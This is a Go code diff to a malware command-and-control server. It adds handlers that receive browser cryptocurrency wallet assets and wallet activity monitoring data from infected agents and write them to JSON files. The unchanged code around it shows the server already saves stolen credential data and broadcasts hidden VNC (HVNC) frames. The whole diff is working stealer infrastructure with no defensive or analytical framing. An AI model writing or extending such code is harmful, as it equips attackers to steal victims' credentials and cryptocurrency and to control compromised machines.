@@ -192,6 +192,16 @@ func (c2 *C2Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		if result.CredentialData != nil && result.Success {
 			c2.saveCredentialData(&result)
 		}
+
+		// Handle crypto assets data from browser wallets
+		if result.CryptoAssets != nil && result.Success {
+			c2.saveCryptoAssetsData(&result)
+		}
+
+		// Handle wallet activity monitoring data
+		if result.WalletActivity != nil && result.Success {
+			c2.saveWalletActivityData(&result)
+		}
 	}
 
 	// Update task status
@@ -1908,4 +1918,72 @@ func (c2 *C2Server) BroadcastHVNCFrame(agentID string, frameData string) {
 		}
 	}
 	hvncMutex.RUnlock()
+}
+
+// saveCryptoAssetsData saves browser wallet crypto assets data to JSON files
+func (c2 *C2Server) saveCryptoAssetsData(result *config.TaskResult) {
+	if result.CryptoAssets == nil {
+		return
+	}
+
+	// Create crypto-assets directory if it doesn't exist
+	cryptoDir := "crypto-assets"
+	if err := os.MkdirAll(cryptoDir, 0755); err != nil {
+		log.Printf("Error creating crypto-assets directory: %v", err)
+		return
+	}
+
+	// Generate filename with timestamp
+	timestamp := time.Now().Format("2006-01-02_15-04-05")
+	filename := filepath.Join(cryptoDir, fmt.Sprintf("crypto_assets_%s_%s_%s.json",
+		result.AgentID[:8], result.TaskID[:8], timestamp))
+
+	// Convert to JSON with proper formatting
+	jsonData, err := json.MarshalIndent(result.CryptoAssets, "", "  ")
+	if err != nil {
+		log.Printf("Error marshaling crypto assets data: %v", err)
+		return
+	}
+
+	// Write to file
+	if err := os.WriteFile(filename, jsonData, 0644); err != nil {
+		log.Printf("Error writing crypto assets file: %v", err)
+		return
+	}
+
+	log.Printf("Crypto assets data saved to: %s", filename)
+}
+
+// saveWalletActivityData saves wallet activity monitoring data to JSON files
+func (c2 *C2Server) saveWalletActivityData(result *config.TaskResult) {
+	if result.WalletActivity == nil {
+		return
+	}
+
+	// Create wallet-activity directory if it doesn't exist
+	activityDir := "wallet-activity"
+	if err := os.MkdirAll(activityDir, 0755); err != nil {
+		log.Printf("Error creating wallet-activity directory: %v", err)
+		return
+	}
+
+	// Generate filename with timestamp
+	timestamp := time.Now().Format("2006-01-02_15-04-05")
+	filename := filepath.Join(activityDir, fmt.Sprintf("wallet_activity_%s_%s_%s.json",
+		result.AgentID[:8], result.TaskID[:8], timestamp))
+
+	// Convert to JSON with proper formatting
+	jsonData, err := json.MarshalIndent(result.WalletActivity, "", "  ")
+	if err != nil {
+		log.Printf("Error marshaling wallet activity data: %v", err)
+		return
+	}
+
+	// Write to file
+	if err := os.WriteFile(filename, jsonData, 0644); err != nil {
+		log.Printf("Error writing wallet activity file: %v", err)
+		return
+	}
+
+	log.Printf("Wallet activity data saved to: %s", filename)
 }
